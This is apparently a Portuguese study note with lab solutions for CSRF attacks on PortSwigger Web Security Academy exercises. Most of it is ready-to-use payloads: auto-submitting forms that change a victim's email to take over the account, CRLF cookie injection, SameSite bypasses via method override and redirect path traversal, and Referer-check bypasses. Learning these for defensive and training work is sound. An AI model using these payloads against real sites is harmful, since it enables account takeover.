# CSRF - Cross Site Request Forgery

Probabilidade: $${\color{red}alta}$$.

O CSRF vai focar em alterar dados da vítima, principalmente seu e-mail. Trocando o e-mail dela, você consegue solicitar um reset de senha e obter acesso a conta.

Um payload de CSRF simples, sem defesa alguma:
```html
<html>
    <body>
        <form action="https://0a430077030c55ff869f58fa00960085.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

<br>

## Laboratórios

**CSRF Where Token Validation Depends on Request Method**

Mude o método da requisição de POST para GET.
```
<img src="https://0ac700da0343bbb482108f6f00a40001.web-security-academy.net/my-account/change-email?email=attacker@evil.net">
```

<br>
<br>

**CSRF Where Token Validation Depends on Token Being Present**

Remova o token CSRF da requisição.
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
```

<br>
<br>

**CSRF Where Token is Not Tied to User Session**

Pegue o CSRF do seu usuário no código-fonte e utilize no payload.
```html
<html>
    <body>
        <form action="https://0a34005103588da98211cbbd004e0017.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="YsoehtJWJkSAyLb1Ubrqv4weLsDoQCMm" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

<br>
<br>

**CSRF Where Token is Tied to Non-Session Cookie**

Ao enviar uma request de troca de e-mail, observe que existem dois tokens CSRF, um como cookie e outro no corpo da requisição.

Nesse caso, o valor que está sendo verificado é o do cookie, assim, precisamos setar um CSRF válido para a vítima atráves disso.

Ao utilizar a função de buscar, observamos o seguinte cookie na resposta:
```
Set-Cookie: LastSearchTerm=test;
```

Podemos abusar disso para setar um novo cookie para a vítima com esse payload:
```
/?search=test
Set-Cookie: csrfKey=YOUR-KEY; SameSite=None

# Encodado em URL:
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

Agora podemos criar o payload do CSRF que adiciona esse cookie e manda a request de troca de e-mail.
```html
<html>
  <body>
    <form action="https://0aba006804d08c8e822188870010007d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test@gmail.com" />
      <input type="hidden" name="csrf" value="TAIGnjd3gMpisovtC7xeVt6zHAGVn1NE" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0aba006804d08c8e822188870010007d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=fnWnRvXgurFNEVnHXx1o1GlAMpzYF5WT%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

<br>
<br>

**CSRF Where Token is Duplicated in Cookie**

O caso é semelhante ao lab de cima, mas os tokens precisam ser iguais (não necessariamente válidos), tanto no cookie, tanto no corpo da requisição.

Podemos criar o payload do CSRF que adiciona esse cookie e mandar a request de troca de e-mail, visto que o valor do token não está associado a sessão do usuário e sim apenas verificando se ambos os valores são iguais.
```html
<html>
  <body>
    <form action="https://0aba006804d08c8e822188870010007d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hijacked@gmail.com" />
      <input type="hidden" name="csrf" value="anyValue" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0aba006804d08c8e822188870010007d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anyValue%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

<br>
<br>

**SameSite Lax Bypass via Method Override**

Altere o método da request para GET e adicione o parâmetro `_method=POST`:
```
/my-account/change-email?email=ww%40gmail.com&_method=POST
```

Exploit:
```
<script>
document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

<br>
<br>

**SameSite Strict Bypass via Client-Side Redirect**
```
/post/comment/confirmation?postId=7../../../my-account/change-email?email=ww%40gmail.com%26submit=1
```

Exploit:
```
script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

<br>
<br>

**SameSite Lax Bypass via Cookie Refresh**

Utilize um exploit de CSRF normal, envie a vítima, aguarde de 5 a 10 segundos e envie novamente.

<br>
<br>

**CSRF Where Referer Validation Depends on Header Being Present**

Adicione `<meta name="referrer" content="never">` no exploit.
```html
<html>
<meta name="referrer" content="never">
    <body>
        <form action="https://0a9500a2031b3160836619a400ab009b.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

<br>
<br>

**CSRF with Broken Referer Validation**

Identifique que a função de e-mail é vulnerável a CSRF, porém, ao mudar o Referer a resposta é "Invalid referer header".

A requisição só é aceita quando o valor do referer contém o domínio esperado em algum lugar.

Neste caso, precisamos adicionar o seguinte header no servidor de exploit:
```
Referrer-Policy: unsafe-url
```

E no exploit, adicionar o domínio como terceiro argumento na função `history.pushState`:
```html
<html>
    <body>
        <form action="https://0aa000a4047c6a358042e98a00f300cc.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            history.pushState("", "", "/?0aa000a4047c6a358042e98a00f300cc.web-security-academy.net")
            document.forms[0].submit();
        </script>
    </body>
</html>
```
